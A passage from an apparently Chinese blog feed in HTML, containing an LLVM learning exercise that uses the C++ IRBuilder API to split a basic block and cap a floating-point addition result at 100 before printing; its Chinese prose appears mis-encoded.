class="token punctuation">,</span> GlobalVariable<span class="token double-colon punctuation">::</span>ExternalLinkage<span class="token punctuation">,</span>                              <span class="token keyword">nullptr</span><span class="token punctuation">,</span> Name<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ol start="2"><li><p>åˆ›å»ºå‡½æ•°æ“ä½œï¼Œ</p><ol><li>å…ˆæŒ‡å®šè¿”å›ç±»å‹ä¸å‡½æ•°çš„å‚æ•°</li><li>æ„é€ å‡½æ•°</li><li>åˆ›å»ºåŸºæœ¬å—</li><li>éå†å‡½æ•°çš„å‚æ•°å¹¶è¯»å–</li><li>åŸºæœ¬å—æ’å…¥æŒ‡ä»¤</li><li>æ·»åŠ è¿”å›æŒ‡ä»¤ï¼Œå³ä½¿å‡½æ•°ä¸º<code>void</code>ï¼Œä¹Ÿåº”æ·»åŠ <code>ret void</code>æŒ‡ä»¤</li></ol></li></ol></div>]]></content>
      
      
      <categories>
          
          <category> Master </category>
          
          <category> LLVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzing </tag>
            
            <tag> LLVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLVM -Learn-Work2</title>
      <link href="/posts/39ba32b9/"/>
      <url>/posts/39ba32b9/</url>
      
        <content type="html"><![CDATA[<h1>LLVM -Learn-Work2</h1><blockquote><p>@2022-04-28 03:05:00</p><p>@sizaif</p><p><img src="https://s2.loli.net/2022/04/16/fuSeLF4G7Kpti1Q.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/16/fuSeLF4G7Kpti1Q.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt=""></p></blockquote><blockquote><p><strong>Work2</strong>ï¼šå¦‚æœåŠ æ³•ç»“æœå¤§äº 100ï¼Œåˆ™å°†ç»“æœæ”¹ä¸º 100ã€‚(åŸºæœ¬å—æ“ä½œ)</p></blockquote><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//main.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"plz input two numbers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> size_t bufsize <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token keyword">char</span><span class="token operator">*</span> buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>bufsize<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bufsize<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">double</span> f1 <span class="token operator">=</span> <span class="token function">atof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bufsize<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">double</span> f2 <span class="token operator">=</span> <span class="token function">atof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.2f + %.2f = %.2f \n"</span><span class="token punctuation">,</span> f1<span class="token punctuation">,</span> f2<span class="token punctuation">,</span> f1<span class="token operator">+</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">free</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="ä¸€-æ€è·¯">ä¸€) æ€è·¯</h2><div class="story post-story"><p>æ•´ä½“æ€æƒ³ä¸ºï¼š è·å¾—<code>fadd</code>æŒ‡ä»¤çš„ç»“æœï¼Œ<code>if</code>è¯­å¥åˆ¤æ–­ä¸€ä¸‹ç»“æœä¸100çš„å¤§å°ï¼Œå¦‚æœå¤§äº100ï¼Œåˆ™ä¿®æ”¹æŒ‡ä»¤ä¸º100</p><p>ä¸€ç§æ€æƒ³ï¼š</p><p>â€‹å…ˆæ‰¾åˆ°<code>fadd</code> æŒ‡ä»¤ä¸<code>fadd</code>æŒ‡ä»¤çš„åä¸€ä¸ªæŒ‡ä»¤<code>call printf</code></p><ol><li>æ ¹æ®æºç ï¼Œ<code>main</code> åªæœ‰ä¸€ä¸ªé»˜è®¤åŸºæœ¬å—</li><li>åœ¨<code>fadd</code> <font color='cornflowerblue'>æŒ‡ä»¤å‰</font>ï¼Œå…ˆå­˜å…¥å¸¸æ•°å€¼<code>100.0</code></li><li>åœ¨<code>fadd</code> æŒ‡ä»¤åé¢(<code>call printf</code>æŒ‡ä»¤å‰æ·»åŠ  <code>fcmp</code>åˆ¤æ–­æŒ‡ä»¤</li><li>ä»<code>call printf</code>æŒ‡ä»¤å¼€å§‹å°†é»˜è®¤å—ä¸€åˆ†ä¸º: <code>defaut </code>å—å’Œ<code>defaut_ret</code> å—</li><li>æ’å…¥ä¸¤ä¸ªæ–°çš„åŸºæœ¬å—<code>change_prt</code> å’Œ <code>defaut_prt</code></li><li><code>change_prt</code>åŸºæœ¬å—çš„å†…å®¹ä¸ºè¯»å–<code>100</code>, è°ƒç”¨<code>printf</code>å‡½æ•°è¾“å‡ºæ–°çš„å€¼ï¼Œè·³è½¬åˆ°<code>defaut_ret</code> freeå†…å­˜</li><li><code>defaut_prt</code>åŸºæœ¬å—çš„å†…å®¹ä¸ºè¯»å–<code>fadd</code>çš„ç»“æœï¼Œè°ƒç”¨<code>printf</code>å‡½æ•°è¾“å‡ºï¼Œè·³è½¬åˆ°<code>defaut_ret</code> freeå†…å­˜</li></ol><p>å…³ç³»å›¾å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/05/03/5lUbNZqTKvrSH6D.png" class="lazyload" data-srcset="https://s2.loli.net/2022/05/03/5lUbNZqTKvrSH6D.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220503152039699"></p><p><strong>åŸæ¥IRä»£ç </strong></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token operator">%</span><span class="token number">20</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">5</span><span class="token punctuation">,</span> align <span class="token number">8</span><span class="token operator">%</span><span class="token number">21</span> <span class="token operator">=</span> fadd <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">22</span> <span class="token operator">=</span> call <span class="token function">i32</span> <span class="token punctuation">(</span>i8<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> @<span class="token function">printf</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">*</span> noundef getelementptr <span class="token function">inbounds</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">21</span> x i8<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">21</span> x i8<span class="token punctuation">]</span><span class="token operator">*</span> @<span class="token punctuation">.</span>str<span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">,</span> i64 <span class="token number">0</span><span class="token punctuation">,</span> i64 <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">double</span> noundef <span class="token operator">%</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token keyword">double</span> noundef <span class="token operator">%</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token keyword">double</span> noundef <span class="token operator">%</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span> <span class="token operator">=</span> load i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>call <span class="token keyword">void</span> @<span class="token function">free</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">23</span><span class="token punctuation">)</span> #<span class="token number">4</span>ret i32 <span class="token number">0</span></code></pre><p><strong>ç›®æ ‡IRä»£ç </strong></p><pre class="language-c" data-language="c"><code class="language-c">Â·Â·Â·Â·Â·  store <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">16</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">17</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">18</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">19</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span>ina1 <span class="token operator">=</span> alloca <span class="token keyword">double</span><span class="token punctuation">,</span> align <span class="token number">8</span>  store <span class="token keyword">double</span> <span class="token number">1.000000e+02</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span>ina1<span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">20</span> <span class="token operator">=</span> fadd <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token number">19</span>  <span class="token operator">%</span>inf1 <span class="token operator">=</span> fcmp ugt <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">1.000000e+02</span>  br i1 <span class="token operator">%</span>inf1<span class="token punctuation">,</span> label <span class="token operator">%</span>change_prt<span class="token punctuation">,</span> label <span class="token operator">%</span>defaut_prtdefaut_ret<span class="token operator">:</span>                                       <span class="token punctuation">;</span> preds <span class="token operator">=</span> <span class="token operator">%</span>defaut_prt<span class="token punctuation">,</span> <span class="token operator">%</span>change_prt  <span class="token operator">%</span><span class="token number">21</span> <span class="token operator">=</span> load i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span> align <span class="token number">8</span>  call <span class="token keyword">void</span> @<span class="token function">free</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">21</span><span class="token punctuation">)</span> #<span class="token number">4</span>  ret i32 <span class="token number">0</span>change_prt<span class="token operator">:</span>                                       <span class="token punctuation">;</span> preds <span class="token operator">=</span> <span class="token operator">%</span>defaut  <span class="token operator">%</span><span class="token number">22</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span>ina1<span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">23</span> <span class="token operator">=</span> call <span class="token function">i32</span> <span class="token punctuation">(</span>i8<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> @<span class="token function">printf</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> getelementptr <span class="token function">inbounds</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">21</span> x i8<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">21</span> x i8<span class="token punctuation">]</span><span class="token operator">*</span> @<span class="token number">0</span><span class="token punctuation">,</span> i32 <span class="token number">0</span><span class="token punctuation">,</span> i32 <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span>  br label <span class="token operator">%</span>defaut_retdefaut_prt<span class="token operator">:</span>                                       <span class="token punctuation">;</span> preds <span class="token operator">=</span> <span class="token operator">%</span>defaut  <span class="token operator">%</span><span class="token number">24</span> <span class="token operator">=</span> call <span class="token function">i32</span> <span class="token punctuation">(</span>i8<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> @<span class="token function">printf</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> getelementptr <span class="token function">inbounds</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">21</span> x i8<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">21</span> x i8<span class="token punctuation">]</span><span class="token operator">*</span> @<span class="token number">0</span><span class="token punctuation">,</span> i32 <span class="token number">0</span><span class="token punctuation">,</span> i32 <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">)</span>  br label <span class="token operator">%</span>defaut_ret<span class="token punctuation">&#125;</span>Â·Â·Â·Â·Â·</code></pre></div><h2 id="äºŒ-æ‰§è¡Œ">äºŒ) æ‰§è¡Œ</h2><div class="story post-story"><h3 id="2-1-åˆå§‹åŒ–-å‰ç½®">2.1 åˆå§‹åŒ–(å‰ç½®)</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp">LLVMContext context<span class="token punctuation">;</span>IRBuilder<span class="token operator">&lt;</span><span class="token operator">></span> <span class="token function">builder</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>Module<span class="token operator">></span> M<span class="token punctuation">;</span>std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>MIRParser<span class="token operator">></span> MIR<span class="token punctuation">;</span>SMDiagnostic Err<span class="token punctuation">;</span><span class="token comment">/** * #include "llvm/IRReader/IRReader.h" * 2022-04-26 03:04:32 * TODO: * from IR file get Moudle class * */</span>M <span class="token operator">=</span> <span class="token function">parseIRFile</span><span class="token punctuation">(</span><span class="token function">StringRef</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Err<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"debug: M is not null"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token comment">// M->print(llvm::outs(),nullptr);</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"M is null"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    Err<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="2-2-æ‰¾åˆ°faddæŒ‡ä»¤å¹¶æ·»åŠ ç›¸å…³å¿…è¦æŒ‡ä»¤">2.2 æ‰¾åˆ°<code>fadd</code>æŒ‡ä»¤å¹¶æ·»åŠ ç›¸å…³å¿…è¦æŒ‡ä»¤</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * 2022-04-26 03:25:52 * TODO: * è·å–mainå‡½æ•° * */</span><span class="token keyword">auto</span> main_fn <span class="token operator">=</span> M<span class="token operator">-></span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token function">StringRef</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/** * 2022-04-28 02:14:46 * TODO: * æ‰¾åˆ°faddæŒ‡ä»¤,ä¸faddçš„åä¸€ä¸ªæŒ‡ä»¤ * */</span>Instruction <span class="token operator">*</span>in_fadd<span class="token punctuation">,</span><span class="token operator">*</span>in_prt<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>inst_iterator I <span class="token operator">=</span> <span class="token function">inst_begin</span><span class="token punctuation">(</span><span class="token operator">*</span>main_fn<span class="token punctuation">)</span><span class="token punctuation">,</span> E <span class="token operator">=</span> <span class="token function">inst_end</span><span class="token punctuation">(</span><span class="token operator">*</span>main_fn<span class="token punctuation">)</span><span class="token punctuation">;</span> I <span class="token operator">!=</span> E<span class="token punctuation">;</span> <span class="token operator">++</span>I<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>I<span class="token operator">-></span><span class="token function">isBinaryOp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> I<span class="token operator">-></span><span class="token function">getOpcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>Instruction<span class="token double-colon punctuation">::</span>FAdd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// outs() &lt;&lt; *I &lt;&lt; "\n";</span>        in_fadd <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token operator">*</span>I<span class="token punctuation">;</span>        in_prt <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token punctuation">(</span>I<span class="token punctuation">.</span><span class="token keyword">operator</span><span class="token operator">++</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 2022-04-28 02:42:32 * TODO: * %20 = load double, double* %5, align 8 * %21 = fadd double %19, %20 * åœ¨faddæŒ‡ä»¤å‰é¢ * æ·»åŠ ä»¥ä¸‹ä¸¤ä¸ªæŒ‡ä»¤: * &lt;x>  = alloca double, align 8 * store double 1.000000e+02, double* &lt;x>, align 8 *  * */</span><span class="token keyword">auto</span> f32 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">getDoubleTy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> const100 <span class="token operator">=</span> <span class="token class-name">ConstantFP</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token keyword">double</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>in_fadd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> in_alloc <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateAlloca</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"ina1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> in_store <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateStore</span><span class="token punctuation">(</span>const100<span class="token punctuation">,</span>in_alloc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/** * 2022-05-03 12:47:30 * TODO: * åœ¨printfæŒ‡ä»¤å‰æ·»åŠ æ¡ä»¶åˆ¤æ–­(fcmp)æŒ‡ä»¤ * %21 = call i32 (i8*, ...) @printf(i8* noundef Â·Â·Â·Â· * fcmp: * &lt;x> = fcmp ugt double &lt;fadd>, 1.000000e+02 * */</span>builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>in_prt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> in_fcmp <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateFCmpUGT</span><span class="token punctuation">(</span>in_fadd<span class="token punctuation">,</span>const100<span class="token punctuation">,</span><span class="token string">"inf1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-3-åˆ‡å‰²åŸºæœ¬å—">2.3 åˆ‡å‰²åŸºæœ¬å—</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * 2022-05-03 12:49:38 * TODO: * å°†mainä¸­é»˜è®¤å—åˆ†ä¸º2å—: ä¸»ä½“å—å’Œé»˜è®¤retå— * å¹¶æ·»åŠ ä¸¤ä¸ªæ–°å—: ä¿®æ”¹è¾“å‡ºå—å’Œé»˜è®¤è¾“å‡ºå— * */</span><span class="token keyword">auto</span> oldblk <span class="token operator">=</span> <span class="token operator">&amp;</span>main_fn<span class="token operator">-></span><span class="token function">getEntryBlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>oldblk<span class="token operator">-></span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"defaut"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> bb2 <span class="token operator">=</span> <span class="token function">SplitBlock</span><span class="token punctuation">(</span>oldblk<span class="token punctuation">,</span>in_prt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>bb2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"debug: split block wrong! \n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    bb2<span class="token operator">-></span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"defaut_ret"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>BasicBlock <span class="token operator">*</span>change_prt <span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"change_prt"</span><span class="token punctuation">,</span> main_fn<span class="token punctuation">)</span><span class="token punctuation">;</span>BasicBlock <span class="token operator">*</span>defaut_prt <span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"defaut_prt"</span><span class="token punctuation">,</span> main_fn<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>åˆ‡å‰²åŸºæœ¬å—<code>SplitBlock(oldblk,in_prt);</code>å‡½æ•°ï¼Œæ­¤æ—¶åˆ‡å‰²æ•ˆæœå¦‚ä¸‹ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"> <span class="token macro property"><span class="token directive-hash">#</span>     <span class="token directive keyword">auto</span> <span class="token expression">bb2 <span class="token operator">=</span> <span class="token function">SplitBlock</span><span class="token punctuation">(</span>oldblk<span class="token punctuation">,</span>in_prt<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span>Â·Â·Â·Â·Â·Â·Â·  store <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">16</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">17</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">18</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">19</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span>ina1 <span class="token operator">=</span> alloca <span class="token keyword">double</span><span class="token punctuation">,</span> align <span class="token number">8</span>  store <span class="token keyword">double</span> <span class="token number">1.000000e+02</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span>ina1<span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">20</span> <span class="token operator">=</span> fadd <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token number">19</span>  <span class="token operator">%</span>inf1 <span class="token operator">=</span> fcmp ugt <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">1.000000e+02</span>  br label <span class="token operator">%</span><span class="token punctuation">.</span>split<span class="token punctuation">.</span>split<span class="token operator">:</span>                                           <span class="token punctuation">;</span> preds <span class="token operator">=</span> <span class="token operator">%</span><span class="token number">0</span>  <span class="token operator">%</span><span class="token number">21</span> <span class="token operator">=</span> call <span class="token function">i32</span> <span class="token punctuation">(</span>i8<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> @<span class="token function">printf</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef getelementptr <span class="token function">inbounds</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">21</span> x i8<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">21</span> x i8<span class="token punctuation">]</span><span class="token operator">*</span> @<span class="token punctuation">.</span>str<span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">,</span> i64 <span class="token number">0</span><span class="token punctuation">,</span> i64 <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">double</span> noundef <span class="token operator">%</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token keyword">double</span> noundef <span class="token operator">%</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token keyword">double</span> noundef <span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">)</span>  <span class="token operator">%</span><span class="token number">22</span> <span class="token operator">=</span> load i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>  call <span class="token keyword">void</span> @<span class="token function">free</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">23</span><span class="token punctuation">)</span> #<span class="token number">4</span>  ret i32 <span class="token number">0</span><span class="token 